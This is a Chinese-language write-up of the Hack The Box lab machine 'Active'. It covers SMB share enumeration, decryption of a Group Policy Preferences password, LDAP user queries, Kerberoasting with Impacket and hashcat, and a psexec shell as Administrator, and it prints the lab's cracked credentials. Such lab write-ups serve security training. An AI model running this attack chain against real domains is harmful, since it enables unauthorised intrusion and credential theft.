---
description: Easy / SMB共享 / 枚举
---

# ✔️ Active

## 建立立足点

### 信息收集&枚举

* 使用Nmap对目标系统进行开放端口扫描：

<figure><img src="../../.gitbook/assets/1 (18).png" alt=""><figcaption></figcaption></figure>

* 顺便把IP地址和域名写进/etc/hosts中，以便后续使用：

<figure><img src="../../.gitbook/assets/2 (20).png" alt=""><figcaption></figcaption></figure>

* 使用Nmap查找一下相关的SMB漏洞：

```bash
# 过滤出本机上关于smb漏洞扫描的脚本：
local -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
```

<figure><img src="../../.gitbook/assets/3 (15).png" alt=""><figcaption></figcaption></figure>

```bash
nmap --script safe -p 445 10.129.85.245
```

<figure><img src="../../.gitbook/assets/4 (19).png" alt=""><figcaption></figcaption></figure>

没有什么收获：

<figure><img src="../../.gitbook/assets/6 (19).png" alt=""><figcaption></figcaption></figure>

查找到当前目标系统中SMB服务是2.0版本，使用smb-enum-services脚本也无收获，该脚本貌似是作用于SMB 1.0版本的：

<figure><img src="../../.gitbook/assets/7 (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/8 (17).png" alt=""><figcaption></figcaption></figure>

* 尝试匿名登录SMB服务，并枚举其所有共享目录：

```bash
smbclient -L 10.129.85.245
```

<figure><img src="../../.gitbook/assets/9 (16).png" alt=""><figcaption></figcaption></figure>

分别用enum4linux和smbmap这两种工具对这些共享目录进行枚举以及确认当前权限：

```bash
# enum4linux：
enum4linux 10.129.85.245
# smbmap:
smbmap -H 10.129.85.245
```

<figure><img src="../../.gitbook/assets/10 (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/11 (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/12 (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/13 (16).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
smbmap比enum4linux好用
{% endhint %}

* 以上两个工具的输出结果显示，当前这个匿名登录账户对\`/Replication\`目录是可读的，因此可以把该目录下的所有文件内容递归下载到我的Kali本机中，再逐个查看其内容是否有可以利用的信息：

```bash
smbclient //10.129.85.245/Replication
# 连接上之后，依次执行：
RECURSE ON
PROMPT OFF
mget *
```

<figure><img src="../../.gitbook/assets/5 (20).png" alt=""><figcaption></figcaption></figure>

* 在查看各个文件夹内容后，发现路径/{31B2F346-616D-11D2-945F-06C64FB984F9}/MACHTNE/Preferences/Groups目录下有个\`Groups.xml\`文件，这个文件中会用用户名和加密后的密码信息：

<figure><img src="../../.gitbook/assets/14 (16).png" alt=""><figcaption></figcaption></figure>

* 用gpp-decrypt解码后获得明文密码：

<figure><img src="../../.gitbook/assets/15 (16).png" alt=""><figcaption></figcaption></figure>

* 此时已获得有效凭证<mark style="color:red;">**svg\_tgs:GPPstillStandingStrong2k18**</mark>

### GET SHELL

* 利用已获得的有效凭证再次枚举目标系统的SMB服务，看看是否获得了更多的信息和权限：

```bash
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.129.138.113
```

<figure><img src="../../.gitbook/assets/16 (16).png" alt=""><figcaption></figcaption></figure>

* 果然发现多了几个共享目录可读。但与此同时，也用Impacket的GetADUsers.py脚本枚举除了目标系统上所有的用户：

```bash
python3 GetADUsers.py -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.138.113
```

<figure><img src="../../.gitbook/assets/17 (16).png" alt=""><figcaption></figcaption></figure>

* 貌似/Users目录有东西，用凭证登录后逐一查看发现flag：

```bash
smbclient //10.129.138.113/Users -U SVC_TGS%GPPstillStandingStrong2k18
ls
```

<figure><img src="../../.gitbook/assets/18 (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/19 (16).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/20 (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/21 (9).png" alt=""><figcaption></figcaption></figure>

## 权限提升

### 本机信息收集&枚举

* 使用ldapsearch查询活动账户在域控中的属性，过滤出特定目标账户：

```bash
ldapsearch -x -H 'ldap://10.129.138.113' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname |grep sAMAccountName
```

<figure><img src="../../.gitbook/assets/22 (9).png" alt=""><figcaption></figcaption></figure>

```bash
ldapsearch -x -H 'ldap://10.129.138.113' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))"
serviceprincipalname | grep -B 1 servicePrincipalName
```

<figure><img src="../../.gitbook/assets/23 (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/24 (8).png" alt=""><figcaption></figcaption></figure>

### ROOT

* 使用GetUserSPNs.py脚本，提取Administrator的hash:

```bash
python3 GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.138.113 -request
```

<figure><img src="../../.gitbook/assets/25 (7).png" alt=""><figcaption></figcaption></figure>

* 将输出的哈希值存为hash.txt文件，然后用hashcat对它进行爆破以获取Administrator的明文密码：

```bash
hashcat -m 13100 hash.txt rockyou.txt
```

<figure><img src="../../.gitbook/assets/26 (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/27 (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/28 (5).png" alt=""><figcaption></figcaption></figure>

* 此时已获得了管理员的明文密码<mark style="color:red;">**Ticketmaster1968，**</mark>配合psexec.py脚本获得管理员shell，成功root：

```bash
python3 psexec.py active.htb/Administrator@10.129.138.113 
```

<figure><img src="../../.gitbook/assets/29 (5).png" alt=""><figcaption></figcaption></figure>

* 获得flag：

<figure><img src="../../.gitbook/assets/30 (5).png" alt=""><figcaption></figcaption></figure>



{% hint style="info" %}
本例的考察重点是对目标SMB共享资源的枚举，属于简单级别的机器。

(本例机器重置过，所以IP地址中途有所改变，但不影响利用过程和结果)
{% endhint %}
